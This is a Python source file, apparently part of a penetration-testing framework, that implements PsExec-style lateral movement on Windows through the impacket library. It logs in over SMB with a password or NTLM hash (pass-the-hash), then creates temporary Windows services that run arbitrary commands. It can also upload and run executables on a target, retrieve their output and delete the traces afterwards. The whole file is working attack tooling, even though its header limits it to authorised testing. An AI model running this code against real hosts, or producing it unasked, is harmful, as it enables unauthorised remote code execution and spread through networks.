#!/usr/bin/env python3
"""
PsExec 横向移动模块 - PsExec Style Lateral Movement
功能: PsExec 风格远程命令执行

用于授权安全测试，仅限合法渗透测试使用
"""

import logging
import os
import tempfile
import time
import uuid
from typing import Any, Dict, Optional

from .base import (
    AuthMethod,
    BaseLateralModule,
    Credentials,
    ExecutionMethod,
    ExecutionResult,
    FileTransferResult,
    LateralConfig,
    LateralStatus,
)

logger = logging.getLogger(__name__)

# 尝试导入 impacket
try:
    from impacket.dcerpc.v5 import scmr, transport
    from impacket.smbconnection import SMBConnection

    HAS_IMPACKET = True
except ImportError:
    HAS_IMPACKET = False
    logger.debug("impacket 未安装，PsExec 功能受限")


class PsExecLateral(BaseLateralModule):
    """
    PsExec 风格横向移动模块

    通过 SMB 上传可执行文件，使用 SCM 创建服务执行

    支持:
    - 密码认证
    - Pass-the-Hash
    - 远程命令执行
    - 服务创建执行

    Usage:
        creds = Credentials(
            username='administrator',
            password='password123'
        )

        with PsExecLateral('192.168.1.100', creds) as psexec:
            # 执行命令
            result = psexec.execute('whoami')
            print(result.output)

            # 执行并获取输出
            result = psexec.execute_with_output('ipconfig /all')
    """

    name = "psexec"
    description = "PsExec 风格横向移动，通过 SMB 和 SCM 执行命令"
    default_port = 445
    supported_auth = [AuthMethod.PASSWORD, AuthMethod.HASH]
    supports_file_transfer = True  # 支持 SMB 共享文件传输

    def __init__(
        self, target: str, credentials: Credentials, config: Optional[LateralConfig] = None
    ):
        super().__init__(target, credentials, config)
        self._smb_conn: Optional["SMBConnection"] = None
        self._rpc_transport = None
        self._dce = None
        self._scm_handle = None

    @property
    def port(self) -> int:
        """获取端口"""
        return self.config.port or self.config.smb_port or self.default_port

    @property
    def share(self) -> str:
        """获取共享"""
        return self.config.psexec_share or self.config.smb_share

    @property
    def service_name(self) -> str:
        """获取服务名"""
        if self.config.psexec_service_name:
            return self.config.psexec_service_name
        return f"{self.config.smb_service_prefix}SVC{self._session_id}"

    def connect(self) -> bool:
        """建立连接"""
        if not HAS_IMPACKET:
            self.logger.error("impacket 未安装，无法使用 PsExec")
            self._set_status(LateralStatus.FAILED)
            return False

        self._set_status(LateralStatus.CONNECTING)

        try:
            # 建立 SMB 连接
            self._smb_conn = SMBConnection(
                self.target, self.target, sess_port=self.port, timeout=self.config.timeout
            )

            # 认证
            if self.credentials.method == AuthMethod.HASH:
                self._smb_conn.login(
                    self.credentials.username,
                    "",
                    self.credentials.domain or "",
                    self.credentials.lm_hash,
                    self.credentials.nt_hash,
                )
            else:
                self._smb_conn.login(
                    self.credentials.username,
                    self.credentials.password or "",
                    self.credentials.domain or "",
                )

            # 连接到 SCM
            string_binding = f"ncacn_np:{self.target}[\\pipe\\svcctl]"
            self._rpc_transport = transport.DCERPCTransportFactory(string_binding)
            self._rpc_transport.set_smb_connection(self._smb_conn)

            self._dce = self._rpc_transport.get_dce_rpc()
            self._dce.connect()
            self._dce.bind(scmr.MSRPC_UUID_SCMR)

            # 打开 SCM
            resp = scmr.hROpenSCManagerW(self._dce)
            self._scm_handle = resp["lpScHandle"]

            self._connect_time = time.time()
            self._set_status(LateralStatus.CONNECTED)
            self.logger.info(f"PsExec 连接成功: {self.credentials.username}@{self.target}")
            return True

        except Exception as e:
            self.logger.error(f"PsExec 连接失败: {e}")
            self._set_status(LateralStatus.FAILED)
            self._cleanup()
            return False

    def disconnect(self) -> None:
        """断开连接"""
        self._set_status(LateralStatus.DISCONNECTING)
        self._cleanup()
        self._set_status(LateralStatus.DISCONNECTED)

    def _cleanup(self) -> None:
        """清理资源"""
        if self._scm_handle and self._dce:
            try:
                scmr.hRCloseServiceHandle(self._dce, self._scm_handle)
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

        if self._dce:
            try:
                self._dce.disconnect()
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

        if self._smb_conn:
            try:
                self._smb_conn.close()
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

        self._smb_conn = None
        self._rpc_transport = None
        self._dce = None
        self._scm_handle = None

    def execute(self, command: str, timeout: Optional[float] = None) -> ExecutionResult:
        """
        执行命令

        通过创建临时服务执行命令

        Args:
            command: 命令
            timeout: 超时时间
        """
        if not self._dce or not self._scm_handle:
            return ExecutionResult(
                success=False, error="未连接", method=ExecutionMethod.PSEXEC.value
            )

        self._set_status(LateralStatus.EXECUTING)
        self._update_activity()
        start_time = time.time()

        service_name = f"{self.service_name}_{uuid.uuid4().hex[:6]}"
        service_handle = None

        try:
            # 构建命令
            binary_path = f"cmd.exe /c {command}"

            # 创建服务
            resp = scmr.hRCreateServiceW(
                self._dce,
                self._scm_handle,
                service_name,
                service_name,
                lpBinaryPathName=binary_path,
                dwStartType=scmr.SERVICE_DEMAND_START,
            )
            service_handle = resp["lpServiceHandle"]

            # 启动服务
            try:
                scmr.hRStartServiceW(self._dce, service_handle)
            except Exception as e:
                # 服务可能立即停止，这是正常的
                self.logger.debug(f"服务启动: {e}")

            # 等待执行
            time.sleep(1)

            self._set_status(LateralStatus.CONNECTED)

            return ExecutionResult(
                success=True,
                output="命令已执行",
                duration=time.time() - start_time,
                method=ExecutionMethod.PSEXEC.value,
            )

        except Exception as e:
            self._set_status(LateralStatus.CONNECTED)
            return ExecutionResult(
                success=False,
                error=str(e),
                duration=time.time() - start_time,
                method=ExecutionMethod.PSEXEC.value,
            )

        finally:
            # 清理服务
            if service_handle:
                try:
                    scmr.hRDeleteService(self._dce, service_handle)
                except Exception as exc:
                    logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

                try:
                    scmr.hRCloseServiceHandle(self._dce, service_handle)
                except Exception as exc:
                    logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

    def execute_with_output(self, command: str, timeout: Optional[float] = None) -> ExecutionResult:
        """
        执行命令并获取输出

        通过将输出重定向到共享文件

        Args:
            command: 命令
            timeout: 超时时间
        """
        if not self._smb_conn or not self._dce:
            return ExecutionResult(success=False, error="未连接")

        start_time = time.time()
        output_file = f"\\Windows\\Temp\\{self._session_id}_{uuid.uuid4().hex[:6]}.txt"

        try:
            # 执行命令并重定向输出
            full_command = f"{command} > C:{output_file} 2>&1"
            result = self.execute(full_command, timeout)

            if not result.success:
                return result

            # 等待输出写入
            time.sleep(2)

            # 读取输出
            output = self._read_output_file(output_file)

            # 删除临时文件
            self._delete_file(output_file)

            return ExecutionResult(
                success=True,
                output=output,
                duration=time.time() - start_time,
                method=ExecutionMethod.PSEXEC.value,
            )

        except Exception as e:
            return ExecutionResult(
                success=False,
                error=str(e),
                duration=time.time() - start_time,
                method=ExecutionMethod.PSEXEC.value,
            )

    def _read_output_file(self, remote_path: str) -> str:
        """读取输出文件"""
        if not self._smb_conn:
            return ""

        fd, temp_file = tempfile.mkstemp(prefix="art_psexec_")
        try:
            os.close(fd)
            with open(temp_file, "wb") as f:
                self._smb_conn.getFile(self.share, remote_path, f.write)

            with open(temp_file, "r", encoding="utf-8", errors="ignore") as f:
                return f.read()

        except Exception as e:
            return f"读取输出失败: {e}"

        finally:
            if os.path.exists(temp_file):
                os.remove(temp_file)

    def _delete_file(self, remote_path: str) -> bool:
        """删除远程文件"""
        if not self._smb_conn:
            return False

        try:
            self._smb_conn.deleteFile(self.share, remote_path)
            return True
        except (OSError, ConnectionError, IOError):
            return False

    def upload_and_execute(
        self,
        local_path: str,
        remote_name: Optional[str] = None,
        arguments: str = "",
        cleanup: bool = True,
    ) -> ExecutionResult:
        """
        上传并执行可执行文件

        Args:
            local_path: 本地文件路径
            remote_name: 远程文件名 (默认使用原文件名)
            arguments: 命令行参数
            cleanup: 执行后是否删除
        """
        if not self._smb_conn:
            return ExecutionResult(success=False, error="未连接")

        start_time = time.time()

        try:
            # 确定远程文件名
            if not remote_name:
                remote_name = os.path.basename(local_path)

            remote_path = f"\\Windows\\Temp\\{remote_name}"

            # 上传文件
            with open(local_path, "rb") as f:
                self._smb_conn.putFile(self.share, remote_path, f.read)

            self.logger.info(f"上传成功: {local_path} -> {remote_path}")

            # 执行文件
            full_path = f"C:{remote_path}"
            command = f'"{full_path}" {arguments}' if arguments else f'"{full_path}"'

            result = self.execute(command)

            # 清理
            if cleanup:
                time.sleep(2)  # 等待执行完成
                self._delete_file(remote_path)

            result.duration = time.time() - start_time
            return result

        except Exception as e:
            return ExecutionResult(
                success=False,
                error=str(e),
                duration=time.time() - start_time,
                method=ExecutionMethod.PSEXEC.value,
            )

    def upload(self, local_path: str, remote_path: str) -> FileTransferResult:
        """上传文件"""
        if not self._smb_conn:
            return FileTransferResult(
                success=False, source=local_path, destination=remote_path, error="未连接"
            )

        self._set_status(LateralStatus.UPLOADING)
        start_time = time.time()

        try:
            # 规范化路径
            if not remote_path.startswith("\\"):
                remote_path = "\\" + remote_path

            file_size = os.path.getsize(local_path)

            with open(local_path, "rb") as f:
                self._smb_conn.putFile(self.share, remote_path, f.read)

            self._set_status(LateralStatus.CONNECTED)

            return FileTransferResult(
                success=True,
                source=local_path,
                destination=f"{self.share}{remote_path}",
                size=file_size,
                duration=time.time() - start_time,
            )

        except Exception as e:
            self._set_status(LateralStatus.CONNECTED)
            return FileTransferResult(
                success=False,
                source=local_path,
                destination=remote_path,
                error=str(e),
                duration=time.time() - start_time,
            )

    def download(self, remote_path: str, local_path: str) -> FileTransferResult:
        """下载文件"""
        if not self._smb_conn:
            return FileTransferResult(
                success=False, source=remote_path, destination=local_path, error="未连接"
            )

        self._set_status(LateralStatus.DOWNLOADING)
        start_time = time.time()

        try:
            # 规范化路径
            if not remote_path.startswith("\\"):
                remote_path = "\\" + remote_path

            with open(local_path, "wb") as f:
                self._smb_conn.getFile(self.share, remote_path, f.write)

            file_size = os.path.getsize(local_path)
            self._set_status(LateralStatus.CONNECTED)

            return FileTransferResult(
                success=True,
                source=f"{self.share}{remote_path}",
                destination=local_path,
                size=file_size,
                duration=time.time() - start_time,
            )

        except Exception as e:
            self._set_status(LateralStatus.CONNECTED)
            return FileTransferResult(
                success=False,
                source=remote_path,
                destination=local_path,
                error=str(e),
                duration=time.time() - start_time,
            )


# 便捷函数
def psexec(
    target: str,
    username: str,
    password: str = "",
    ntlm_hash: str = "",
    domain: str = "",
    command: str = "whoami",
    get_output: bool = False,
) -> Dict[str, Any]:
    """
    PsExec 命令执行 (便捷函数)

    Args:
        target: 目标主机
        username: 用户名
        password: 密码
        ntlm_hash: NTLM Hash
        domain: 域名
        command: 命令
        get_output: 是否获取输出
    """
    if not HAS_IMPACKET:
        return {"success": False, "error": "impacket 未安装"}

    creds = Credentials(
        username=username,
        password=password if password else None,
        ntlm_hash=ntlm_hash if ntlm_hash else None,
        domain=domain,
    )

    client = PsExecLateral(target, creds)

    if not client.connect():
        return {"success": False, "error": "连接失败", "target": target, "command": command}

    if get_output:
        result = client.execute_with_output(command)
    else:
        result = client.execute(command)

    client.disconnect()

    return {
        "success": result.success,
        "output": result.output,
        "error": result.error,
        "duration": result.duration,
        "target": target,
        "command": command,
        "method": result.method,
    }


def psexec_upload_exec(
    target: str,
    username: str,
    password: str,
    local_file: str,
    arguments: str = "",
    domain: str = "",
    cleanup: bool = True,
) -> Dict[str, Any]:
    """
    上传并执行文件 (便捷函数)
    """
    if not HAS_IMPACKET:
        return {"success": False, "error": "impacket 未安装"}

    creds = Credentials(username=username, password=password, domain=domain)

    client = PsExecLateral(target, creds)

    if not client.connect():
        return {"success": False, "error": "连接失败", "target": target}

    result = client.upload_and_execute(local_file, arguments=arguments, cleanup=cleanup)
    client.disconnect()

    return {
        "success": result.success,
        "output": result.output,
        "error": result.error,
        "duration": result.duration,
        "target": target,
        "file": local_file,
        "method": result.method,
    }


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
    logger.info("=== PsExec Lateral Movement Module ===")
    logger.info(f"impacket 可用: {HAS_IMPACKET}")
    logger.info("使用示例:")
    logger.info("  from core.lateral import PsExecLateral, Credentials, psexec")
    logger.info("  result = psexec('192.168.1.100', 'admin', 'password', command='whoami')")
